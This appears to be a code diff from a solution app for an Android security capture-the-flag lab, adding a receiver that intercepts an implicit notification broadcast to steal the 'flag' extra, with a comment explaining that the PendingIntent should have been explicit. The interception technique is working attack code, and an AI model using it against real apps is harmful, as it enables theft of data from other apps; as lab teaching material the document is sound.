@@ -43,9 +43,32 @@ object DynamicReceivers {
 		}
 	}
 
+	/**
+	 * FLAG 21 - Hijack Notification Button
+	 * Technique: Implicit broadcast interception via PendingIntent.getBroadcast()
+	 *
+	 * Flow:
+	 * 1. Flag21Activity posts a notification with a "Give Flag" button
+	 * 2. That button's PendingIntent wraps an IMPLICIT intent (no setComponent)
+	 *    containing the real decrypted flag in a "flag" extra
+	 * 3. Because it's implicit, the broadcast is one-to-many - ANY app
+	 *    registered for action "io.hextree.broadcast.GIVE_FLAG" receives it too
+	 * 4. We register for the same action to steal the real flag content
+	 *
+	 * Key insight: the PendingIntent should have been explicit (setComponent) -
+	 * using an implicit intent here means the "button press" broadcast leaks
+	 * to every matching receiver on the device, not just Flag21Activity's own.
+	 */
+	private val flag21Receiver = object : BroadcastReceiver() {
+		override fun onReceive(context: Context, intent: Intent) {
+			Utils.dumpIntent(context, intent, "Flag 21")
+		}
+	}
+
 	// Pair each receiver with the action(s) it should listen for
 	private fun all(): List<Pair<BroadcastReceiver, IntentFilter>> = listOf(
 		flag18Receiver to IntentFilter("io.hextree.broadcast.FREE_FLAG"),
+		flag21Receiver to IntentFilter("io.hextree.broadcast.GIVE_FLAG")
 	)
 
 	// ───────────────────────────────────────────────
